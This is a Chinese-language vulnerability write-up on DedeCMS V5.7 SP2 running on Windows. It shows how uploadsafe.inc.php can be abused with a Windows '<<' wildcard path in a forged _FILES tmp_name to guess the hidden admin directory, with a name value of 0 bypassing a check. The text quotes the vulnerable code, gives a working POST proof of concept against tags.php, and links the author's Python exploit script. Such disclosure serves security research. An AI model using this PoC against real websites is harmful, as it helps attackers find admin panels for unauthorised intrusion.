##解决DEDECMS历史难题--找后台目录
###利用限制
* 仅针对windows系统

* DedeCMS目前下载的最新版的还存在此问题。（DedeCMS-V5.7-UTF8-SP2.tar.gz ）在网盘里找相应名字的就行

###漏洞成因
首先看核心文件common.inc.php 大概148行左右

```php
	if($_FILES)
	{
	    require_once(DEDEINC.'/uploadsafe.inc.php');
	}
```
跟进uploadsafe.inc.php文件，25行

```php
if( preg_match('#^(cfg_|GLOBALS)#', $_key) )
{
    exit('Request var not allow for uploadsafe!');
}
$$_key = $_FILES[$_key]['tmp_name']; //获取temp_name 
${$_key.'_name'} = $_FILES[$_key]['name'];
${$_key.'_type'} = $_FILES[$_key]['type'] = preg_replace('#[^0-9a-z\./]#i', '', $_FILES[$_key]['type']);
${$_key.'_size'} = $_FILES[$_key]['size'] = preg_replace('#[^0-9]#','',$_FILES[$_key]['size']);
if(!empty(${$_key.'_name'}) && (preg_match("#\.(".$cfg_not_allowall.")$#i",${$_key.'_name'}) || !preg_match("#\.#", ${$_key.'_name'})) )
{
    if(!defined('DEDEADMIN'))
    {
        exit('Not Admin Upload filetype not allow !');
    }
}
if(empty(${$_key.'_size'}))
{
    ${$_key.'_size'} = @filesize($$_key);
}
$imtypes = array
(
    "image/pjpeg", "image/jpeg", "image/gif", "image/png", 
    "image/xpng", "image/wbmp", "image/bmp"
);
if(in_array(strtolower(trim(${$_key.'_type'})), $imtypes))
{
    $image_dd = @getimagesize($$_key); 
    //问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。
    if (!is_array($image_dd))
    {
        exit('Upload filetype not allow !');
    }
}
......
```

出发点是找个可以利用<<通配符猜解后台目录，所以只要`$$_key`参数可控就可以达到目的。

但在这之前有个`if(!defined('DEDEADMIN'))`的判断,这个很好绕过设置name为0就可以绕过。

因为这块第一个if判断`$_key.'_name'`是否为空，为空就不往下进行判断，所以给name赋值0就可以绕过了。

```php
if(!empty(${$_key.'_name'}) && (preg_match("#\.(".$cfg_not_allowall.")$#i",${$_key.'_name'}) || !preg_match("#\.#", ${$_key.'_name'})) )
{
    if(!defined('DEDEADMIN'))
    {
        exit('Not Admin Upload filetype not allow !');
    }
}
```
最后关键的一点就是要让文件存在还和不存在返回不同的内容就要控制type参数了。

当目录文件存在的时候 返回tag.php正常页面。当不存在的时候返回：Upload filetype not allow !

### POC
	http://localhost/dedecms/tags.php
	
	post:
	
	dopost=save&_FILES[b4dboy][tmp_name]=./de</images/admin_top_logo.gif&_FILES[b4dboy][name]=0&_FILES[b4dboy][size]=0&_FILES[b4dboy][type]=image/gif

Common.inc.php 是被全局包含的文件，只要文件php文件包含了Common.inc.php都可以进行测试，以tags.php文件为例

上面是作者的原POC，有个小问题需要注意一下，POST的是tags.php 属于根目录下的文件，在根目录下没有tags.php的情况下，需要找一个包含common.inc.php的文件，在这种情况下只能找二级目录下的文件，例如：/plus /include

漏洞作者给的exp是PHP版本，[Dedecms找后台目录漏洞python版](https://github.com/zmzsg100/Cms-vuln-and-EXP/blob/master/find_dedeadmin.py) <-这是我的python版本